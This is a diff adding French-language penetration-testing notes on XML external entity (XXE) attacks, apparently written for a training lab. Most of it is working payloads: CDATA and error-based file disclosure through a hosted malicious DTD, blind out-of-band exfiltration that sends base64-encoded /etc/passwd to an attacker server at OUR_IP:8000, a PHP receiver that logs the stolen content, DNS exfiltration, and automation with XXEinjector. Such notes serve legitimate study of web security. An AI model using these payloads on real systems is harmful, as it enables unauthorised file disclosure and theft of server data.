@@ -130,4 +130,167 @@ Utiliser `SYSTEM "http://127.0.0.1:8080/admin"` pour scanner ports ou intranet.
 
 ---
 
+# Advanced File Disclosure
+
+## 1. Advanced Exfiltration avec CDATA
+
+### Problème  
+- Certains fichiers ne passent pas en XML brut.  
+- On peut contourner ça avec `<![CDATA[ ... ]]>`.  
+- Limite : XML interdit de combiner interne + externe → on utilise **Parameter Entities** via un DTD externe.
+
+### Étapes
+Créer `xxe.dtd` localement :
+```
+<!ENTITY joined "%begin;%file;%end;">
+```
+
+Héberger le DTD :
+```
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python3 -m http.server 8000
+```
+
+Payload côté cible :
+```
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %xxe;
+]>
+<root>
+  <email>&joined;</email>
+</root>
+```
+
+➡️ Retourne le contenu brut de `submitDetails.php`.
+
+## 2. Error-Based XXE
+
+### Contexte  
+- Aucun output direct disponible.  
+- On force l’application à générer une **erreur** → fuite du contenu.
+
+### DTD malveillant (hébergé en local)
+```
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+### Payload côté cible
+```
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+➡️ Le serveur renvoie une erreur contenant le contenu de `/etc/hosts`.  
+➡️ Peut être adapté à n’importe quel fichier source (`/var/www/html/file.php`, etc.).
+
+## 3. Notes & Limitations
+- **CDATA trick** : utile pour binaires, caractères spéciaux.  
+- **Error-based** : limité par taille/format, mais efficace si logs ou erreurs visibles.  
+- Peut révéler chemins système (utile pour cibler d’autres fichiers).  
+- Ces techniques complètent les attaques classiques **file://** et **php://filter/**.
+
+## 🔑 Points clés
+- Héberger DTD externe sur votre serveur → exfiltration.  
+- Utiliser `%parameterEntities;` pour combiner plusieurs entités.  
+- Exploiter erreurs PHP/XML pour forcer la fuite.  
+
+---
+
+# Blind Data Exfiltration
+
+## 1. OOB (Out-of-Band) Exfiltration
+
+### Idée
+- Quand rien n’est affiché (ni XML, ni erreurs).  
+- On force la cible à **faire une requête vers notre serveur** contenant le fichier exfiltré.  
+- On encode en base64 pour éviter les erreurs XML.
+
+### DTD malveillant
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+### Serveur de réception
+`index.php` sur notre machine :
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+
+Lancer serveur PHP :
+```
+php -S 0.0.0.0:8000
+```
+
+### Payload côté cible
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+➡️ La cible fait une requête HTTP → notre serveur reçoit et décode le contenu (`/etc/passwd`, etc.).
+
+## 2. Variante DNS Exfiltration
+- Encoder les données comme **sous-domaine** :  
+  `ENCODEDTEXT.our.domain.com`  
+- Utiliser `tcpdump` ou DNS logs pour capturer & décoder.
+
+## 3. Automatisation avec XXEinjector
+
+### Installation
+```
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+
+### Préparer une requête brute
+Fichier `/tmp/xxe.req` :
+```
+POST /blind/submitDetails.php HTTP/1.1
+Host: TARGET_IP
+Content-Type: text/plain;charset=UTF-8
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+
+### Lancer l’outil
+```
+ruby XXEinjector.rb \
+  --host=OUR_IP --httpport=8000 \
+  --file=/tmp/xxe.req \
+  --path=/etc/passwd \
+  --oob=http --phpfilter
+```
+
+➡️ Les fichiers exfiltrés sont stockés dans `Logs/target_ip/...`
+
+## 🔑 Points clés
+- **Blind XXE** = pas de retour → utiliser OOB HTTP/DNS.  
+- **PHP filter + base64** garantit un contenu exploitable.  
+- **XXEinjector** simplifie et automatise toutes les étapes.  
+
+Ressources : 
+[XXEinjector](https://github.com/enjoiz/XXEinjector)
+
+
+
+
+
 
